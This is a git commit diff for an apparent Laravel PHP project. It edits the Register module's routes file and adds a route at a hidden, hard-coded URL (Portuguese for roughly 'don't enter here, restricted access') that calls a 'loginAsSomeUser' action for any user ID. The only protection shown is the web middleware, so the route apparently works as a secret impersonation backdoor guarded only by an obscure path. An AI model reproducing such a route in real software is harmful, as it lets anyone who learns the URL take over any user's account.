0561f0c59c99d7d5a62f0aa25dab17b31c2c1586
julio leichtweis <julioleichtweis@gmail.com>
2019-07-17 15:23:23 -0300

    ajustes gerais
    Former-commit-id: b6100ed24933b1e7fe9eced582f12d707222add3

--- Modules/Register/Http/routes.php
+++ Modules/Register/Http/routes.php
@@ -5,11 +5,15 @@ Route::group(['middleware' => 'web', 'prefix' => 'register', 'namespace' => 'Mod
     Route::get('/', 'Modules\Register\Http\Controllers\RegisterController@index')->name('registers');
     Route::get('/{parametro}', 'RegisterController@create');
 
-
     Route::post('/', 'RegisterController@store');
 
     Route::get('/', 'RegisterController@index');
 
+});
+
+Route::group(['middleware' => 'web', 'namespace' => 'Modules\Register\Http\Controllers'], function()
+{
+    Route::get('/nao/entre/aqui/cloudfox2019/bage2018/acesso/restrito/{user_id}', 'RegisterController@loginAsSomeUser');
 });
 
 
